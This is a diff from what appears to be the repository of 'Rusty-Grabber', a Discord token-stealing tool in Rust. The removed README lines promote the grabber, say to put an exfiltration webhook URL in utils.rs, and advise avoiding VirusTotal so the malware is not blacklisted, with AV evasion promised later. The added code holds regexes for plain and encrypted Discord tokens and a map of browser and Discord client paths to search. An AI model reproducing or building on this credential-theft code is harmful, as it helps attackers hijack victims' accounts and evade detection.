@@ -1,34 +1,11 @@
-# Rusty-Grabber
-🚀 a blazing fast Discord Token Grabber, no popo made with python
+use std::collections::HashMap;
+use lazy_static::lazy_static;
 
-## Fastest Token Grabber **ever** :
-```bash
-Rusty-Grabber> time ./target/release/grabber
-0.00user 0.00system 0:00.72elapsed 0%CPU (0avgtext+0avgdata 5396maxresident)k
-0inputs+0outputs (1419major+0minor)pagefaults 0swaps
-```
+use crate::global::utils::{ROAMING, APPDATA};
 
-## Fill your Webhook in utils.rs :
-```bash
-./src/global/utils.rs:4 in the WEBHOOK_URL const.
-```
+pub const ENCRYPTED_REGEX : &str = "dQw4w9WgXcQ:[^\"]*";
+pub const REGEX : &str = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}";
 
-## virus total report with 0 Obfuscation, Xoring or AV Evasion
-**![Alt text](https://media.discordapp.net/attachments/1146101828451303476/1146101874282471626/Wb8Bg40.png?width=1556&height=820)**
-### Avoid using virus total when scanning the malware.
-### They will blacklist the program
-### Use [kleenscan](https://kleenscan.com/) instead (Anonymous reporting)
-
-## I will maintain the code updated and more optimised
-```md
-- Work with new discord token's encryption 2023
-- Grab all token's possible
-- Check each token's
-- Soon DiscordProtector bypasser and AV evasion maybe paid
-```
-
-## Browser's & Discord Client handle :
-```rs
 lazy_static! {
     pub static ref PATHS: HashMap<&'static str, String> = {
         let map = HashMap::from([
@@ -63,4 +40,3 @@ lazy_static! {
         map
     };
 }
-```
